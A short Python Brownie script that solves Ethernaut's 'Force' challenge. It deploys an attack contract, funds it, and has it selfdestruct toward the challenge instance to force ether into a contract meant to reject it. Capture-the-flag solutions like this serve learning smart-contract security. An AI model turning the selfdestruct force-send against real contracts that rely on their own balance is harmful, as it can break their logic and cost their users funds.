from scripts.helpful_scripts import get_account
from brownie import web3, Attack07
from web3 import Web3

# PLAYER address is "0xF8f8269488f73fab3935555FCDdD6035699deE25"

ETHERNAUT_INSTANCE = "0x05825eb9A72f957aD87cB4F121A6F8925166664a"
BALANCE = web3.eth.getBalance(ETHERNAUT_INSTANCE)


def main():

    player = get_account()

    print(f"\nBalance of Force contract = {BALANCE}\n")

    attack_contract = Attack07.deploy({"from": player})
    print(f"Attack contract dployed at: {attack_contract}")

    player.transfer(to=attack_contract, amount=1000000000000000)

    # call attack (which calls selfdestruct(ETHERNAUT_INSTANCE)
    attack_contract.attack(ETHERNAUT_INSTANCE)

    """ 
    BALANCE still showed 0 because I didn't update it
    Actual balance shows as 0.01 ether in ethernaut
    """
    # print(f"\nBalance of Force contract now = {BALANCE}\n")
